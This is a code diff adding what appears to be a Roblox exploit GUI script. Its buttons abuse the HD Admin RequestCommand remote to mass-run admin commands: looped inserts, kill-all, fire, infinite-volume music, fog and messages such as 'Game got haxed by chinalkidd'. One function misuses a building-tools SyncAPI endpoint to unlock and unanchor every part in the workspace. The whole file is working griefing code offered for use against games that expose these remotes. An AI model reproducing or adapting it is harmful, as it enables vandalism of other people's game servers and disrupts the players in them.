+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";disco")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(MLXVV_fake_script)()
+local function WPSLAHI_fake_script() -- spamzam.LocalScript 
+	local script = Instance.new('LocalScript', spamzam)
+
+	function ww()
+		wait(1)
+		while true do
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+			RequestCommand:InvokeServer(";insert 187789986")
+			RequestCommand:InvokeServer(";insert 187789986")
+			RequestCommand:InvokeServer(";insert 187789986")
+			RequestCommand:InvokeServer(";insert 187789986")
+			RequestCommand:InvokeServer(";insert 187789986")
+			RequestCommand:InvokeServer(";insert 187789986")
+			RequestCommand:InvokeServer(";insert 187789986")
+			RequestCommand:InvokeServer(";insert 187789986")
+
+			wait(1)
+		end
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(WPSLAHI_fake_script)()
+local function QUEYJ_fake_script() -- spamzam.LocalScript 
+	local script = Instance.new('LocalScript', spamzam)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";ff me")
+
+
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(QUEYJ_fake_script)()
+local function GSDSZ_fake_script() -- TextButton_6.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_6)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";music 18979905723")
+		RequestCommand:InvokeServer(";volume inf")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(GSDSZ_fake_script)()
+local function AXZYOVC_fake_script() -- TextButton_7.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_7)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";fire all")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(AXZYOVC_fake_script)()
+local function SWKE_fake_script() -- TextButton_8.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_8)
+
+	function decal()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = workspace.Part
+				},
+				[3] = stringg
+			}
+
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+
+		function Unanchor()
+			for i,v in game.Workspace:GetDescendants() do
+				spawn(function()
+					SetLocked(v,false)
+					SetAnchor(false,v)
+				end)
+			end
+		end
+		Unanchor()
+	end
+	script.Parent.MouseButton1Up:Connect(decal)
+end
+coroutine.wrap(SWKE_fake_script)()
+local function NVXJ_fake_script() -- TextButton_9.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_9)
+
+	function ww()
+		while true do
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+			RequestCommand:InvokeServer(";sm chinalkidd")
+			wait(1)
+		end
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(NVXJ_fake_script)()
+local function FXZQWC_fake_script() -- TextButton_10.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_10)
+
+	function ww()
+		while true do
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+			RequestCommand:InvokeServer(";h team chinalkidd is join today")
+			wait(1)
+		end
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(FXZQWC_fake_script)()
+local function FTYN_fake_script() -- TextButton_11.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_11)
+
+	function ww()
+		while true do
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+			RequestCommand:InvokeServer(";chat all Game got haxed by chinalkidd")
+			RequestCommand:InvokeServer(";chat all chinalkidd")
+			wait(0.3)
+		end
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(FTYN_fake_script)()
+local function OENGWP_fake_script() -- TextButton_12.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_12)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";spin all 999")
+
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(OENGWP_fake_script)()
+local function YLSG_fake_script() -- TextButton_13.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_13)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";warp all 999")
+		RequestCommand:InvokeServer(";fog 1 1")
+
+
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(YLSG_fake_script)()
+local function PXGB_fake_script() -- TextButton_14.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_14)
+
+	function ww()
+		script.Parent.Parent.spamzam.LocalScript.Enabled = false
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(PXGB_fake_script)()
+local function YVZL_fake_script() -- TextButton_15.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_15)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";music 127653283576622")
+		RequestCommand:InvokeServer(";volume inf")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(YVZL_fake_script)()
+local function XWZMG_fake_script() -- TextButton_16.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_16)
+
+	function ww()
+		while true do
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+			RequestCommand:InvokeServer(";color all black")
+			wait(0.4)
+			RequestCommand:InvokeServer(";color all red")
+			wait(0.4)
+			RequestCommand:InvokeServer(";color all blue")
+			wait(0.4)
+			RequestCommand:InvokeServer(";color all orange")
+			wait(0.4)
+			RequestCommand:InvokeServer(";color all yellow")
+			wait(0.4)
+			RequestCommand:InvokeServer(";color all green")
+		end
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(XWZMG_fake_script)()
+local function IQOO_fake_script() -- TextButton_17.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_17)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";createteam blue 少羽nb")
+		RequestCommand:InvokeServer(";createteam red 少羽nb")
+		RequestCommand:InvokeServer(";createteam green 少羽nb")
+		RequestCommand:InvokeServer(";createteam purple 少羽nb")
+		RequestCommand:InvokeServer(";createteam orange 少羽nb")
+
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(IQOO_fake_script)()
+local function AQFVII_fake_script() -- TextButton_18.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_18)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";titler all chinalkidd")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(AQFVII_fake_script)()
+local function LVWOJJA_fake_script() -- TextButton_19.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_19)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";char all chinalkidd")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(LVWOJJA_fake_script)()
+local function OFCD_fake_script() -- TextButton_20.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_20)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";name all Ham00d was here")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(OFCD_fake_script)()
+local function ZOQT_fake_script() -- TextButton_21.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_21)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";fog 1 1")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(ZOQT_fake_script)()
+local function NKPZB_fake_script() -- TextButton_21.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_21)
+
+	function ww()
+		while true do
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+			RequestCommand:InvokeServer(";fogcolor red")
+			wait(0.4)
+			RequestCommand:InvokeServer(";fogcolor orange")
+			wait(0.4)
+			RequestCommand:InvokeServer(";fogcolor yellow")
+			wait(0.4)
+			RequestCommand:InvokeServer(";fogcolor green")
+			wait(0.4)
+			RequestCommand:InvokeServer(";fogcolor blue")
+			wait(0.4)
+			RequestCommand:InvokeServer(";fogcolor purple")
+		end
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(NKPZB_fake_script)()
+local function ZEYGC_fake_script() -- TextButton_22.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_22)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";fogstart inf ;fogcolor red ;Fire all ;Color all black ;time 1 ;disco ;blur all inf  ;loopwarp all ;sound 6129291390 ;volume inf ;loopkill all  ;sm chinalkidd")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(ZEYGC_fake_script)()
+local function GEJUHR_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	--Smrdi mi pero
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+		dragToggle = nil
+		local dragSpeed = 0
+		dragInput = nil
+		dragStart = nil
+		local dragPos = nil
+		function updateInput(input)
+			local Delta = input.Position - dragStart
+			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+		end
+		Frame.InputBegan:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = Frame.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragToggle = false
+					end
+				end)
+			end
+		end)
+		Frame.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
+		end)
+		game:GetService("UserInputService").InputChanged:Connect(function(input)
+			if input == dragInput and dragToggle then
+				updateInput(input)
+			end
+		end)
+	end
+
+	dragify(script.Parent)
+end
+coroutine.wrap(GEJUHR_fake_script)()
+local function PSITD_fake_script() -- ScreenGui.LocalScript 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	while true do
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";savemap")
+		wait(30)
+	end
+end
+coroutine.wrap(PSITD_fake_script)()
+
+
